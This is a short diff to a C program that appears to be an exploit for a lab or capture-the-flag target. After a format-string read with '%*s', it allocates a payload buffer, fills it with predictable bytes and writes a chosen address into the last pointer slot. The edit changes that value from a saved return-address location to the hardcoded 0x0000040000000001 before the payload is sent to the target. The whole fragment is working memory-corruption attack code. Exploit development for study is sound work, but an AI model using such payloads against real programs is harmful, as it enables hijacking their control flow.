@@ -28,11 +28,11 @@ int main() {
     send();
     get_formatted("%*s");
 
-    unsigned explsz = 512;
-   	char *expl = (char *)malloc(explsz);
-   	// Initialize the buffer with '\1' to make the contents predictable.
-   	memset((char*)expl, '\1', explsz);
-    expl[explsz/sizeof(void*)-1] = (void*)cur_return_addr_loc;
+    unsigned explsz = 504;
+    void* *expl = (void**)malloc(explsz);
+    // Initialize the buffer with '\1' to make the contents predictable.
+    memset((void*)expl, '\1', explsz);
+    expl[explsz/sizeof(void*)-1] = (void*) 0x0000040000000001;
 
     put_str("p ");
     put_bin((char*)expl, explsz);
